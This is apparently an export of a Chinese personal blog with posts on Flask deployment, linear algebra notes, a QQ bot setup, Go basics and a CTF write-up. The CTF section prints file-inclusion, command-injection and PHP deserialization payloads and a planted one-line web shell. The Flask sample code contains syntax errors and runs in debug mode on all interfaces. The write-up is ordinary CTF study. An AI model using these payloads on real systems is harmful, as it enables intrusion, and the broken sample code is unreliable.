def post(self): return { 'success' : True 'code' : 200 } pass 这样我们就编写好了一个POST访问就会返回成功的API。 众所周知，我们的API多半需要获取一些参数字段。这里以以下的请求格式为例： { 'username' : 'xxxxx', 'password' : 'xxxxx' } class Query(Resource): def post(self): parser = reqparse.RequestParser() #初始化 parser.add_argument('username', required = True) #添加需要的参数字段 parser.add_argument('password', required = True) args = parser.parse_args() #将参数解析为Python字典 #在解析为Python字典之后，既可以用Python字典方式获取字段的值 username = args['username'] password = args['password'] #一些你需要实现的功能 return { 'data' : data #返回一些你需要返回的数据 'success' : True 'code' : 200 } pass 至此，一个支持POST方法的API就完成了。 Sample Code(Full version): from flask import Flask from flask_restful import Resource, Api, reqparse app = Flask(__name__) api = Api(app) class Query(Resource): def post(self): parser = reqparse.RequestParser() #初始化 parser = add_argument('username', required = True) #添加需要的参数字段 parser = add_argument('password', required = True) args = parser.parse_args() #将参数解析为Python字典 #在解析为Python字典之后，既可以用Python字典方式获取字段的值 username = args['username'] password = args['password'] #一些你需要实现的功能 return { 'data' : data #返回一些你需要返回的数据 'success' : True 'code' : 200 } pass api.add_resource(Query, '/query') if __name__ == '__main__': app.run(debug = True, host=\"0.0.0.0\", port=3773) #这里开启了Debug模式，使用端口3773，当然你也可以不使用这个端口. ","date":"2022-02-05","objectID":"/api/:3:4","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"测试 将上述程序保存为API.py，并在本地试运行。 试试在本地编写一个测试脚本。 import requests import json url = \"http://127.0.0.1:3773/query\" headers = { 'Content-Type' : 'application/json' } data = { 'username' : 'shino', 'password' : 'daisuke' } sessions = requests.session() response = sessions.post(url, data = json.dumps(data), headers = headers, verify = False) for what in response: print(what.decode()) 运行返回： { 'success' : True, 'code' : 200 } 说明API已经可以运行了。 ","date":"2022-02-05","objectID":"/api/:3:5","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"配置并启动uWSGI 在项目路径下创建一个配置文件uwsgi.ini 这里项目路径以/home/flask为例。 填入以下内容： [uwsgi] # uwsgi 启动时所使用的地址与端口,也可以使用.sock文件的方式 socket = 127.0.0.1:3773 # 指向网站目录 chdir = /home/flask # python 启动程序文件 wsgi-file = API.py # python 程序内用以启动的 application 变量名 callable = app # 处理器数 processes = 1 # 线程数 threads = 1 #项目flask日志文件 logto = /home/moco/www/myflask/log.log 以uwsgi.ini为配置文件启动uwsgi： uwsgi --ini /home/flask/uwsgi.ini ","date":"2022-02-05","objectID":"/api/:4:0","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"配置并启动Nginx 配置Nginx配置文件中的sites-enabled/default server { listen 1664; #希望接收信息的端口 server_name sh1no.icu; #好像可以不填？ charset utf-8; client_max_body_size 75M; location / { include uwsgi_params; uwsgi_pass 127.0.0.1:3773; #与uwsgi启动的端口一致 } } 运行nginx： service nginx start 你可能会用到的命令： 重新加载配置文件 nginx -s reload （该命令需要nginx正在运行，否则会报错找不到pid） 重启nginx服务 service nginx restart 停止nginx服务 nginx -s stop ","date":"2022-02-05","objectID":"/api/:5:0","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"本地测试 还是用刚刚的测试脚本： import requests import json url = \"http://127.0.0.1:1664/query\" #这里改成nginx监听的端口 headers = { 'Content-Type' : 'application/json' } data = { 'username' : 'shino', 'password' : 'daisuke' } sessions = requests.session() response = sessions.post(url, data = json.dumps(data), headers = headers, verify = False) for what in response: print(what.decode()) 在服务器端运行，如果成功则说明nginx、uwsgi、flask三者连接完好。 ","date":"2022-02-05","objectID":"/api/:6:0","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"开放防火墙设置 若将上述脚本中127.0.0.1:1664改成服务器的公网ip或域名无法得到回复，说明我们连接可能被防火墙阻止。 首先检查服务器提供商安全组策略是否放开端口 然后检查系统自带的防火墙。以Ubuntu20.04为例，Ubuntu20.04默认安装了ufw防火墙 输入： sudo ufw status verbose 可以查看ufw的活动状态和允许的访问端口。 设置允许端口： sudo ufw allow 1664 运行测试脚本，访问成功，大功告成！ ","date":"2022-02-05","objectID":"/api/:7:0","tags":null,"title":"使用Flask+nginx+uwsgi在服务器上部署一个简单的API接口","uri":"/api/"},{"categories":null,"content":"矩阵及其初等变换 ","date":"2022-01-02","objectID":"/matrix/:1:0","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"概念 同型矩阵：A与B都是m*n矩阵，则称A与B是同型矩阵。 负矩阵：A的每个元换成它的相反数，记为-A 数量矩阵：$kI，k∈R$ 反称矩阵：$A^T=-A$ ","date":"2022-01-02","objectID":"/matrix/:1:1","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"Conclusions $(AB)^T=B^TA^T$ $(AB)^{-1}=B^{-1}A^{-1}$ AB为对称矩阵$\\iff AB=BA$ 行初等变换左乘初等矩阵，列初等变换右乘。 $(A^T)^{-1}=(A^{-1})^T$ ","date":"2022-01-02","objectID":"/matrix/:1:2","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"行列式 ","date":"2022-01-02","objectID":"/matrix/:2:0","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"Conclusions 若行列式某两行对应元成比例， 行列式为零。 $|A^{-1}|=\\frac{1}{|A|}$ $|A^{\\star}|=|A|^{n-1}$ 范德蒙德行列式结论：$\\prod_{1≤j\u003ci\u003cn}(x_i-x_j)$ $A^{\\star}A=|A|I$ A可逆$\\iff R(A)=n \\iff AX=0$只有零解$\\iff AX=b$有唯一解 $R(A)=R(B) \\iff $ A与B等价（A与B是同型矩阵） ","date":"2022-01-02","objectID":"/matrix/:2:1","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"几何空间 ","date":"2022-01-02","objectID":"/matrix/:3:0","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"概念 自由向量：不考虑起点的向量 方向角：向量与坐标轴的夹角 方向余弦：方向角的余弦 平面束：经过直线$l$的全体平面称为过$l$的平面束 ","date":"2022-01-02","objectID":"/matrix/:3:1","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"Conclusions $Prj_u(\\vec{a}+\\vec{b})=Prj_u\\vec{a}+Prj_u\\vec{b}$ $[\\vec{a}\\ \\vec{b}\\ \\vec{c}]=0 \\iff \\vec{a}\\ \\vec{b}\\ \\vec{c}$共面 ","date":"2022-01-02","objectID":"/matrix/:3:2","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"n维向量空间 ","date":"2022-01-02","objectID":"/matrix/:4:0","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"概念 子空间：设$V$是$R^n$的一个非空子集合，则$V$是$R^n$的一个子空间的充分必要条件是$V$对于$R^n$的加法和数乘运算是封闭的。 所有向量$\\vec{a_1}\\ \\vec{a_2}\\ \\vec{a_3}\\ … \\vec{a_n}$线性组合的集合用$L(\\vec{a_1},\\vec{a_2},…,\\vec{a_n})$表示。 只含零向量的向量组的秩为0。 ","date":"2022-01-02","objectID":"/matrix/:4:1","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"Conclusions $A=(\\vec{a_1},\\vec{a_2},…,\\vec{a_n})$，则$\\vec{a_1},\\vec{a_2},…,\\vec{a_n}$线性相关$\\iff AX=0$有非零解$\\iff R(A)\u003cn\\iff |A|=0$ $R(AB)≤min{R(A),R(B)}$ $R(A+B)≤R(A)+R(B)$ $max{R(A),R(B)}R[(A,B)]≤R(A)+R(B)$ $AX=0$的基础解系所含解向量个数为$n-R(A)$ $R(A)=n-1$则$R(A^{\\star})=1$ ","date":"2022-01-02","objectID":"/matrix/:4:2","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"特征值与特征向量 ","date":"2022-01-02","objectID":"/matrix/:5:0","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"概念 特征子空间：对于特征值$\\lambda$的所有特征向量构成的子空间。 ","date":"2022-01-02","objectID":"/matrix/:5:1","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"Conclusions $\\lambda$是$A$的一个特征值，则$\\frac{1}{\\lambda}$是$A^{-1}$的一个特征值，特征向量相同。 方阵的n个特征值之和等于方阵的主对角元之和，n个特征值之积等于方阵的行列式，方阵A可逆的充分必要条件是A的特征值全部不为零。 柯西不等式：$(\\vec{a}·\\vec{b})^2≤|\\vec{a}|^2|\\vec{b}|^2$ 正交矩阵： $A^{-1}=A^T$ $|A|=1or-1$ $A,B$是正交矩阵，则$AB$是正交矩阵。 实对称矩阵的对应不同特征值的特征向量彼此正交。 ","date":"2022-01-02","objectID":"/matrix/:5:2","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"二次型与二次曲面 ","date":"2022-01-02","objectID":"/matrix/:6:0","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"Conclusions 正定二次型$\\iff A$的特征值全为正数$\\iff A$的所有顺序主子式都大于零 负定二次型$\\iff A$的特征值全为负数$\\iff A$的顺序主子式满足$(-1)^kP_k\u003e0$（奇负偶正） 正惯性指数等于正特征值个数。 ","date":"2022-01-02","objectID":"/matrix/:6:1","tags":null,"title":"线性代数与空间解析几何 女娲补天复习笔记","uri":"/matrix/"},{"categories":null,"content":"配置机器人 ","date":"2021-11-08","objectID":"/bot/:1:0","tags":null,"title":"使用Nonebot2和Gocq搭建QQ机器人并部署到服务器","uri":"/bot/"},{"categories":null,"content":"QQ机器人的基本架构 这里引用一个看到过的例子： 在一个餐馆中，你点了一盘菜。此时会发生什么事情呢？ 1、服务员接受你点的菜 2、服务员把你点的菜告诉大厨 3、大厨进行一个烹饪 4、服务员把菜端到你桌上 在一个QQ机器人中，go-cqhttp就类似于一个服务员，负责接收消息、把消息传达给nonebot2、发送消息。而nonebot2 就相当于一个大厨，负责“思考”对消息该做出什么反应。 那么go-cqhttp如何将消息传达给nonebot2呢？ 这里我们使用的是反向websocket连接：go-cqhttp会主动寻找nonebot2的程序，并将消息通过websocket推送给nonebot2。当然，如果你只是想要做出一个QQ机器人，你可以不需要深入了解该通信方式。 ","date":"2021-11-08","objectID":"/bot/:1:1","tags":null,"title":"使用Nonebot2和Gocq搭建QQ机器人并部署到服务器","uri":"/bot/"},{"categories":null,"content":"准备 我们需要：一个云服务器，nonebot2，go-cqhttp 由于nonebot2是基于python3.7+的，所以我们还需要配置一个python。 我推荐在服务器上执行命令前先使用sudo -i切换到管理员账户来避免一些麻烦 安装系统镜像\u0026python 首先你需要一个云服务器，并安装系统镜像。我这里选用的是Ubuntu20.07系统镜像，因为Ubuntu20.07自带一个Python3.8.10，可以省去python的配置步骤。 这一步按理来说是可以一键完成的，起码腾讯云和阿里云都有一键安装的入口。 安装nonebot2 执行以下命令： pip3 install nb-cli pip3 install nonebot-adapter-cqhttp 如果找不到库的话，可以试试换源： pip3 install nb-cli -i https://pypi.org/simple pip3 install nonebot-adapter-cqhttp -i https://pypi.org/simple 安装go-cqhttp 下载go-cqhttp 在go-cqhttp的Release页面找到go-cqhttp_linux_386.tar.gz并下载。 或者直接点击这里下载。 这里下载的是适用于Linux的32位go-cqhttp，如果你是64位，请找到并下载go-cqhttp_linux_amd64.tar.gz 将go-cqhttp上传至服务器 这里使用宝塔Linux面板辅助上传。宝塔yyds。 这是宝塔官网，可以在上面找到对应系统镜像的安装脚本：https://www.bt.cn/download/linux.html 如果你和我一样使用Ubuntu，直接执行以下命令吧： wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh \u0026\u0026 sudo bash install.sh 执行完成后在服务器上执行bt来配置用户名和密码。 执行/etc/init.d/bt default查看面板入口，一般是你的ip:8888/xxxxxx的形式并访问，用你刚刚的用户名密码登录。 配置好宝塔之后，点击左边菜单栏中“文件“即可进行文件管理、编辑和上传。 我们在根目录新建一个/bot文件夹，上传go-cqhttp并解压。 如果你的宝塔并没有帮你解压成功，你可以在服务器上执行以下命令： cd go-cq所在文件目录（例如cd /bot） tar -xzvf 文件名 或者你也可以解压完之后再上传，反正也没有几个文件。 至此，我们需要的东西就准备好了。 ","date":"2021-11-08","objectID":"/bot/:1:2","tags":null,"title":"使用Nonebot2和Gocq搭建QQ机器人并部署到服务器","uri":"/bot/"},{"categories":null,"content":"配置 配置go-cqhttp 先跑一下。 cd go-cq所在文件目录 ./go-cqhttp 出现： 未找到配置文件，正在为您生成配置文件中！ 请选择你需要的通信方式: \u003e 1: HTTP通信 \u003e 2: 正向 Websocket 通信 \u003e 3: 反向 Websocket 通信 \u003e 4: pprof 性能分析服务器 请输入你需要的编号，可输入多个，同一编号也可输入多个(如: 233) 您的选择是: 输入3然后按回车，此时我们就会发现go-cq的文件夹里生成了一个config.yml，编辑并修改以下几处： 我这里是直接用宝塔进行的编辑，我也推荐各位直接使用宝塔。 account: # 账号相关 uin: 1233456 # QQ账号 把uin改为bot的QQ账号。不建议填写password，在不填写password时第一次将会使用扫码登录，可以避免密码登录造成的一些问题（比如滑块验证）。 servers: # 添加方式，同一连接方式可添加多个，具体配置说明请查看文档 #- http: # http 通信 #- ws: # 正向 Websocket #- ws-reverse: # 反向 Websocket #- pprof: #性能分析服务器 # 反向WS设置 - ws-reverse: # 反向WS Universal 地址 # 注意 设置了此项地址后下面两项将会被忽略 universal: ws://127.0.0.1:xxxx/cqhttp/ws #修改的位置！！！ # 反向WS API 地址 api: ws://your_websocket_api.server # 反向WS Event 地址 event: ws://your_websocket_event.server # 重连间隔 单位毫秒 reconnect-interval: 3000 middlewares: \u003c\u003c: *default # 引用默认中间件 此处把xxxx替换为端口号其他不变。不建议使用会冲突的端口号，建议从5000-65535取值。随意填一个数就行。 此时你可以试着运行一下go-cq cd go-cq所在文件目录 ./go-cqhttp 如果你看到这个： [INFO]: アトリは、高性能ですから! 说明你成功啦！ 配置nonebot2 你需要新建一个文件夹给nonebot2。不推荐使用中文文件夹名字。这里同样使用宝塔完成操作。 新建一个bot.py，写入以下代码： #!/usr/bin/env python3 # -*- coding: utf-8 -*- import nonebot from nonebot.adapters.cqhttp import Bot as CQHTTPBot #初始化nb nonebot.init() app = nonebot.get_asgi() #连接驱动 driver = nonebot.get_driver() driver.register_adapter(\"cqhttp\", CQHTTPBot) #加载插件(除此处其他配置不建议更改) nonebot.load_builtin_plugins() nonebot.load_plugins('src/plugins') #启动bot if __name__ == \"__main__\": nonebot.logger.warning(\"Always use `nb run` to start the bot instead of manually running!\") nonebot.run(app=\"__mp_main__:app\") 在相同目录下创建.env文件，写入以下内容： HOST=127.0.0.1 PORT=xxxx DEBUG=False SUPERUSERS=[\"管理员账号1\",\"管理员账号2\"] COMMAND_START=[\"/\",\"!!\"] 其中PORT修改为刚刚你在go-cq配置过程中输入的端口号。 COMMAND_START字段是命令的起始符号，以该符号开头的将会被识别为”命令“被处理。我一般喜欢使用\"\"，即所有文字都被nonebot接收并处理。 然后我们在该目录下新建一个src文件夹，在src内再新建一个plugins文件夹。这里就是你存放你写的nonebot2插件的地方啦。 ","date":"2021-11-08","objectID":"/bot/:1:3","tags":null,"title":"使用Nonebot2和Gocq搭建QQ机器人并部署到服务器","uri":"/bot/"},{"categories":null,"content":"运行机器人 没意外的话到这里我们的机器人就已经准备好了，直接开始运行吧！ 在服务器上，以腾讯云为例，每次按”登录“只会打开一个界面。但我们需要运行两个程序。咋办呢？ 首先执行： sudo -i cd bot.py所在文件目录 screen python bot.py 重新打开，执行： sudo -i cd go-cqhhtp所在文件目录 screen ./go-cqhttp 重新打开，执行： sudo -i screen -ls 这个时候你应该看到有两个进程正在运行。 用QQ给你的机器人发送：/echo Hello_World! 收到机器人的回复了！至此我们的机器人就算配置完毕了。 ","date":"2021-11-08","objectID":"/bot/:1:4","tags":null,"title":"使用Nonebot2和Gocq搭建QQ机器人并部署到服务器","uri":"/bot/"},{"categories":null,"content":"编写插件-实现你想要的功能 先鸽了。 ","date":"2021-11-08","objectID":"/bot/:2:0","tags":null,"title":"使用Nonebot2和Gocq搭建QQ机器人并部署到服务器","uri":"/bot/"},{"categories":null,"content":"本文基于C++、python语言基础学习. ","date":"2021-10-18","objectID":"/go/:0:0","tags":null,"title":"Go语言乱学速成学习笔记","uri":"/go/"},{"categories":null,"content":"基本 示例 package main import \"fmt\" func main() { fmt.Println(\"Hello, World!\") } 1、当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ） 2、大括号不准换行，一行代表一个语句结束，没有分号。 3、标识符、注释规则与cpp相同。 4、变量类型：数字、字符串、布尔。 ","date":"2021-10-18","objectID":"/go/:1:0","tags":null,"title":"Go语言乱学速成学习笔记","uri":"/go/"},{"categories":null,"content":"语法相关 ","date":"2021-10-18","objectID":"/go/:2:0","tags":null,"title":"Go语言乱学速成学习笔记","uri":"/go/"},{"categories":null,"content":"变量相关 变量声明 //var v_name type //Example: var a string = \"ABCD\" var b, c int = 1, 2 //var v_name //Example: var d int // 初始值为0 var e string //初始值为\"\" //var v_name = value var f = true var g = 0 //自动判断变量类型 // v_name = value intVal := 1 //相当于: var intVal int intVal = 1 //这种结构只能在函数体中出现。 /*var( v_name1 type1 v_name2 type2 )*/ //Example: var ( a int b bool ) 函数内变量不允许声明但不使用 变量赋值 a = 1 a, b = 1, 2 a, b = b, a _, b = b, a 空白标识符_是一个只写变量，用于抛弃值。 常量 const 使用const代替var，其余和变量声明一样。可以调用函数： const ( a = \"abc\" b = len(a) c = unsafe.Sizeof(a) ) 函数必须是内置函数，否则会编译错误。 iota 不会用，不用！但是可以先记在这里。 相当于表示const声明的行索引。 const ( a = iota //0 b = iota //1 c = iota //2 ) 可以简写成这样： const ( a = iota //0 b //1 c //2 ) 一个猜测：啥都没写的常量相当于把上一行复制一遍。 const ( a = iota //0 b //1 c //2 d = \"ha\" //独立值，iota += 1 e //\"ha\" iota += 1 f = 100 //iota +=1 g //100 iota +=1 h = iota //7,恢复计数 i //8 ) const ( i = 1\u003c\u003ciota //1 \u003c\u003c 0 j = 3\u003c\u003ciota //3 \u003c\u003c 1 k //3 \u003c\u003c 2 l //3 \u003c\u003c 3 ) ","date":"2021-10-18","objectID":"/go/:2:1","tags":null,"title":"Go语言乱学速成学习笔记","uri":"/go/"},{"categories":null,"content":"运算符 全都和cpp一样。 ","date":"2021-10-18","objectID":"/go/:2:2","tags":null,"title":"Go语言乱学速成学习笔记","uri":"/go/"},{"categories":null,"content":"语法相关 条件语句 if a \u003e 20 { .... } else { .... } 循环 基本 for i := 0; i \u003c= 10; i++ { //普通 } for sum \u003c= 10 { //类似while } for { //无限循环 } strings := []string{\"shino\", \"suki\"} for i, s := range strings { fmt.Println(i, s) // 迭代访问数组、字符串、切片元素 } break\u0026continue for i := 1; i \u003c= 3; i++ { fmt.Printf(\"i: %d\\n\", i) for i2 := 11; i2 \u003c= 13; i2++ { fmt.Printf(\"i2: %d\\n\", i2) break } } //跳出一层循环 re: for i := 1; i \u003c= 3; i++ { fmt.Printf(\"i: %d\\n\", i) for i2 := 11; i2 \u003c= 13; i2++ { fmt.Printf(\"i2: %d\\n\", i2) break re } } //跳出至标记处 continue同理。 函数 func funtion_name( [parameter list] ) [return types] { ..... } func max(a, b int) int { if a \u003e b { return a } else { return b } } func swap1(a, b int) (int, int) { return b, a } //返回多个值 func swap(x *int, y *int) { var tmp int tmp = *x *x = *y *y = tmp }//引用传递 func main() { getSquareRoot := func(x float64) float64 { return math.Sqrt(x) } fmt.Println(getSquareRoot(9)) } //一些炫酷 变量作用域 与C++相同。但是局部变量的默认值也是0 数组 var v_name [SIZE] var_type var a = [5]int{1, 2, 3, 4, 5} b := [5]int{1, 3, 4, 5, 3} c := [...]int{1, 2, 3, 4, 5} //数组长度不确定可用...代替 d := [5]int{1:2, 3:4} //仅初始化下标为1, 3的元素 e := [5][5]int{} //二维数组 package main import \"fmt\" func main() { // 创建空的二维数组 animals := [][]string{} // 创建三一维数组，各数组长度不同 row1 := []string{\"fish\", \"shark\", \"eel\"} row2 := []string{\"bird\"} row3 := []string{\"lizard\", \"salamander\"} // 使用 append() 函数将一维数组添加到二维数组中 animals = append(animals, row1) animals = append(animals, row2) animals = append(animals, row3) // 循环输出 for i := range animals { fmt.Printf(\"Row: %v\\n\", i) fmt.Println(animals[i]) } } //一些炫酷实例 结构体 type Books struct { title string author string subject string book_id int } func main() { var Book1 Books Book1.book_id = 3 fmt.Println(Book1.book_id) } ","date":"2021-10-18","objectID":"/go/:2:3","tags":null,"title":"Go语言乱学速成学习笔记","uri":"/go/"},{"categories":null,"content":"写在前面 好难，寄！ 军训开始我就弃赛了，所以军训开始后才上的新题我一个都没有写。这里只有前面的几个水题wp。 其实回想了一下真的认真干过的题目就只有Re的生瓜蛋子和babyexception题，其他都是不会就摸鱼 ","date":"2021-10-07","objectID":"/cnssrecruit/:1:0","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Web 有人专挑php的题做，我不说是谁。 ","date":"2021-10-07","objectID":"/cnssrecruit/:2:0","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"[Baby] Signin Burpsuite新手教程？抓包修改请求头的METHOD字段，然后进行一些GET、POST和修改Cookie得到flag. CNSS{Y0u_kn0w_GET_and_POST} ","date":"2021-10-07","objectID":"/cnssrecruit/:2:1","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"[Baby]GitHacker 一个简单的git泄露板子题，使用GitExtract获得泄漏的git源码，在index.html.d54c93文件中看到flag。 CNSS{Ohhhh_mY_G0d_ur3_real_G1th4ck3r} ","date":"2021-10-07","objectID":"/cnssrecruit/:2:2","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"[Mid]BlackPage F12看到如下内容： \u003c?php $file = $_GET[\"file\"]; $blacklist = \"(**blacklist**)\"; if (preg_match(\"/\".$blacklist.\"/is\",$file) == 1){ exit(\"Nooo,You can't read it.\"); }else{ include $file; } //你能读到 mybackdoor.php 吗？ \u003e 是一个文件包含漏洞的题，利用php://filter读取mybackdoor.php源码。 http://121.41.7.149:65002/?file=php://filter/read=convert.base64-encode/resource=mybackdoor.php 看到如下内容： \u003c?php error_reporting(0); function blacklist($cmd){ $filter = \"(\\\\\u003c|\\\\\u003e|Fl4g|php|curl| |0x|\\\\\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\\\$\\\\{IFS\\\\}|index|\\\\*)\"; if (preg_match(\"/\".$filter.\"/is\",$cmd)==1){ exit('Go out! This black page does not belong to you!'); } else{ system($cmd); } } blacklist($_GET['cmd']); ?\u003e 看到一些关键字不能用，然后可以执行system指令。 先用ls看看有啥文件。观察到空格被屏蔽，使用$IFS$9代替空格。 http://121.41.7.149:65002/mybackdoor.php?cmd=ls$IFS$9../../../ 看到有个文件名字叫Fl4g_is_here 由于cat被屏蔽，使用more代替。Fl4g被屏蔽，使用Fl''4g绕过。构造payload如下： http://121.41.7.149:65002/mybackdoor.php?cmd=more$IFS$9../../../Fl%27%274g_is_here 用眼睛看，得到flag。 CNSS{0ops!Y0u_G0t_My_Bl4ckp4ge!} ","date":"2021-10-07","objectID":"/cnssrecruit/:2:3","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"[Mid]太极掌门人 进行一个base64绕过使\u003c?php exit;?\u003e无法被识别。即： train=php://filter/write=convert.base64-decode/resource=tmp.php 此时\u003c?php exit;?\u003e中的\u003c?;会被忽略，变为phpexit。按照base64四个一组的加密规则，在goods最前面加上一个字符即可让后面的内容被正常解密。 goods=a(一些读取flag.php的代码的base64加密结果) post，然后一边写入tmp.php一边访问tmp.php即可得到flag。 CNSS{F45ter_7han_Re5per} ","date":"2021-10-07","objectID":"/cnssrecruit/:2:4","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"[Mid]bestLanguage 这个题要求我们在unserialize时就触发__destruct()函数。一个简单的变量覆盖，先把$gay赋值成这个class，再赋值成别的导致这个class被销毁触发__destruct()得到flag。序列化相关知识可参考上一篇夏令营游记。 http://42.194.177.253:10001/?p=O:9:\"superGate\":2:{s:3:\"gay\";O:9:\"superGate\":2:{s:3:\"gay\";b:1;}s:3:\"gay\";i:123} 用眼睛看，得到flag： cnss{Array_Tr1ck_is_use4} ","date":"2021-10-07","objectID":"/cnssrecruit/:2:5","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"[Mid]To_be_Admin_Again 这个题在save.php中用php_serialize的方法写入SESSION，在index.php中用php方式读取，造成了一些不一致。 在save.php中写入p|(一些序列化的东西)即可在index.php读取SESSION时创造一个类型为class CNSS的对象从而触发__destruct()执行code代码。 有一个喜闻乐见的事情是当序列化中声明的变量个数大于实际个数的时候会跳过__wakeup()函数。构造如下： http://121.41.7.149:65004/save.php?cnss=myfile|O:4:%22CNSS%22:3:{s:14:%22%00CNSS%00username%22;s:5:%22admin%22;s:10:%22%00CNSS%00code%22;s:17:%22eval($_GET[%27a%27]);%22;} 这样我们就可以通过在index.php中GET一个a变量达成任意命令的执行。看看有啥文件？ http://121.41.7.149:65004/?a=echo%20var_dump(scandir(dirname(__FILE__))); 得到： array(5) { [0]=\u003e string(1) \".\" [1]=\u003e string(2) \"..\" [2]=\u003e string(5) \"2.php\" [3]=\u003e string(9) \"index.php\" [4]=\u003e string(8) \"save.php\" } 有个令人在意的2.php，看看是啥？ http://121.41.7.149:65004/?a=echo%20show_source(%222.php%22); 得到： \u003c?php @eval($_POST['x5tar']); ?\u003e 经典一句话木马。AntSword连接http://121.41.7.149:65004/2.php随便看看得到flag。 CNSS{Admin_1s_w4tch1ng_y0u} ","date":"2021-10-07","objectID":"/cnssrecruit/:2:6","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"Re ","date":"2021-10-07","objectID":"/cnssrecruit/:3:0","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x01 Hello Re! 点击就送 cnss{This_is_the_format_of_flag} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:1","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x02 Find the Key 点击就送 cnss{IDA-is-a-useful-tool-of-reverse} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:2","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x03 有手就行 有手就行 cnss{ACEGIKMOQSUWY} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:3","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x04 Py大师第一步 好耶，这个题是Shino的一血！ Python里自带一个命令可以生成程序的字节码的。就自己写一写观察一下不同的命令字节码大概长啥样，最后可以搞出一个字节码和dis.txt相差不大的程序： #笑死，我根本没保存，而且我懒得再做一遍 cnss{This_is_the_dis_of_the_python} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:4","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x05 你这 Flag 挺能藏啊 好耶，这个题是Shino的一血！ 逆一下看看，核心代码是三个一组进行如下操作： 记第一个是a0,第二个是a1,第三个是a2。 a0 ^= a1; a2 ^= a1; a1 ^= a0; 我们可以看到执行操作后的结果，记为A0,A1,A2. A0 = a0^a1 A1 = a1^a0^a1 = a0 A2 = a2^a1 得： a0 = A1 a1 = A0^A1 a2 = A2^A1^A0 重新推了一遍，可能不对，但是也可能对了，总之就是这个思路 cnss{U_do_A_Good_Job_In_decode!!} ","date":"2021-10-07","objectID":"/cnssrecruit/:3:5","tags":null,"title":"CNSS招新赛游记","uri":"/cnssrecruit/"},{"categories":null,"content":"0x06 (*\u0026C)++ 好耶，这个题是Shino的一血！ 那我把我交的wp直接进行一个粘贴吧 Stage 1: 众所周知，char占1个字节，short占2个字节，long占4个字节，long long占8个字节 也就是说： 在*(pull+1)=*(pul+1)=*(pus+1)=*(puc+1)=0x80;中的每个1的类型不同，对应的指针偏移量也就不同，分别是1,2,4,8，也就将相应的位置赋值为了0x80 Stage 2: 这个时候如果分开写的话： *(pll+1) = 0x80 *(pl+1) = 0x80 *(ps+1) = 0x80 *(pc+1) = 0x80 输出的结果和之前是一样的。那么发生了什么事情呢？ 众所周知，0x80=128，超过了char的范围，进行了一个溢出。此时char有符号，也就是说 (pc+1) = 0x80的返回值是-128，这个值对后面产生了影响。这段代码等价于： *(pll+1) = -128 *(pl+1) = -128 *(ps+1) = -128 *(pc+1) = 0x80 